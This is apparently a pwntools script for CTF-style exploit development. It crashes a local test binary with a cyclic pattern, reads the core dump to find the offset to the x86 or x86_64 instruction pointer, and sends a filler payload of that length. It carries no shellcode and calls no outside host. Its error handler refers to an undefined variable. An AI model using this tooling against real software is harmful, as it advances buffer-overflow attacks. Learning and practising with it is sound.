#!/usr/bin/env python3

# find_offset.py - a pwntools script that can calculate an offset for x86 and x86_64 ELF binaries
# Created by dilldylanpickle on 5-8-2023
# GitHub: https://github.com/dilldylanpickle
#
# Dependencies:
#   - Python 3.8.10 (https://www.python.org/downloads/release/python-3810/)
#   - Pwntools (https://github.com/Gallopsled/pwntools)

import os           # Provides a way of using operating system dependent functionalities
from pwn import *   # Import CTF framework and exploit development library

def exploit(binary_path):

    # Create an ELF object and start a new process
    elf = context.binary = ELF(binary_path)

    # Set log level to debug if debugging is needed
    context.log_level = 'debug'

    # Automatically close the process when the "with" block is exited
    with process(elf.path) as io:

        # Get the offset by calling the find_offset() function
        offset = find_offset(elf)

        # Construct the payload
        payload = b'\x69' * offset

        # Print the payload in hexadecimal representation for debugging purposes
        log.debug("The payload will be " + ''.join('\\x{:02x}'.format(x) for x in payload))
        
        # Send the payload and print the output
        io.sendline(payload)
        log.info(io.clean().decode())

def find_cyclic_pattern(io):

    # Generate and send a cyclic pattern as input to the binary
    pattern = cyclic(144)
    io.sendline(pattern)
    io.wait()

    # Return the core file
    return io.corefile

def find_offset(elf):

    # Save the original log level which would be either 'info' or 'debug'
    log_level = context.log_level

    # Disable logging for offset calculations
    context.log_level = 'error'

     # Record a memory crash in the Core_Dumps subdirectory
    try:

        # Create a directory called 'Core_Dumps' if it does not already exist
        if not os.path.exists('Core_Dumps'):
            os.makedirs('Core_Dumps')

        # Automatically close the process when the "with" block is exited
        with process(elf.path) as io:

            # If the architecture is x86, calculate the offset to overwrite eip
            if context.arch == 'i386':
                core = find_cyclic_pattern(io)
                offset = cyclic_find(p32(core.eip), n=4)

            # If the architecture is x86_64, calculate the offset to overwrite rip
            elif context.arch == 'amd64':
                core = find_cyclic_pattern(io)
                rip = core.rip
                offset = cyclic_find(core.read(core.rsp, 4))

            # Revert the log level to the original value
            context.log_level = log_level

        # Move all files with the pattern 'core.*' or just 'core' to the 'Core_Dumps' directory
        for filename in os.listdir('.'):
            if filename.startswith('core.') or filename == 'core':
                os.rename(filename, os.path.join('Core_Dumps', filename))


        # Output the calculated offset for debugging purposes
        log.debug(f"The offset calculated to overwrite the instruction pointer is {offset} bytes")

        # Return the calculated offset to overwrite the instruction pointer
        return offset

    except FileNotFoundError as e:
        log.error(f"Error: Binary file not found at {binary_path}")
        raise e
    except PermissionError as e:
        log.error(f"Error: You do not have permission to access {binary_path}")
        raise e
    except ValueError as e:
        log.error(f"Error: Unable to find cyclic pattern in core dump")
        raise e
    except Exception as e:
        log.error(f"Error: An unexpected error occurred while finding the offset")
        raise e

if __name__ == '__main__':

    # Initiate the executables name to declare a valid filesystem path
    binary_path = './vulnerable32'
    warnings.filterwarnings("ignore", category=BytesWarning)

    # Perform the exploitation on the specified binary
    exploit(binary_path)
